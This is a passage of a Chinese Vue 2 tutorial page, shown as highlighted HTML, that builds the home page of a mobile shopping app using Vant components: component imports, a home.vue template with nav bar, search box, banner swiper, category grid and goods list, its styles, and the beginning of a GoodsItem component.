class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// vant2-ui.js按需导入组件</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vue"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Button</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Tabbar</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">TabbarItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">NavBar</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Search</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Swipe</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">SwipeItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Grid</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">GridItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vant"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Tabbar</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">TabbarItem</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Button</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">NavBar</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Search</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Swipe</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">SwipeItem</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Grid</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">GridItem</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>静态结构和样式 <code>layout/home.vue</code></p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"home"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 导航条 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"智慧商城"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">fixed</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 搜索框 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-search</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">readonly</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">shape</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"round"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#f1f1f2"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请在此输入搜索关键词"</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/search'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 轮播图 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"my-swipe"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">autoplay</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">3000</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">indicator-color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"white"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"@/assets/banner1.jpg"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"@/assets/banner2.jpg"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"@/assets/banner3.jpg"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 导航 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-grid</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">column-num</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"5"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">icon-size</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"40"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-grid-item</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">icon</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"http://cba.itlike.com/public/uploads/10001/20230320/58a7c1f62df4cb1eb47fe83ff0e566e6.png"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">text</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"新品首发"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/category'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-grid</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 主会场 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"main"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"@/assets/main.png"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 猜你喜欢 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"guess"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"guess-title"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">—— 猜你喜欢 ——</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">GoodsItem</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">GoodsItem</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/components/GoodsItem.vue"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"HomePage"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #6A9955">// 主题 padding</span></span><span class="line"><span style="color: #D7BA7D">.home</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 导航条样式定制</span></span><span class="line"><span style="color: #D7BA7D">.van-nav-bar</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#c21401</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-nav-bar__title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 搜索框样式定制</span></span><span class="line"><span style="color: #D7BA7D">.van-search</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 分类导航部分</span></span><span class="line"><span style="color: #D7BA7D">.my-swipe</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-swipe-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">185px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#39a9ed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.my-swipe</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-swipe-item</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">185px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 主会场</span></span><span class="line"><span style="color: #D7BA7D">.main</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 猜你喜欢</span></span><span class="line"><span style="color: #D7BA7D">.guess</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.guess-title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 商品样式</span></span><span class="line"><span style="color: #D7BA7D">.goods-list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f6f6f6</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>其中将商品项封装成组件 GoodsItem.vue 在 components 包下：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-item"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/prodetail'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"@/assets/product.jpg"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span 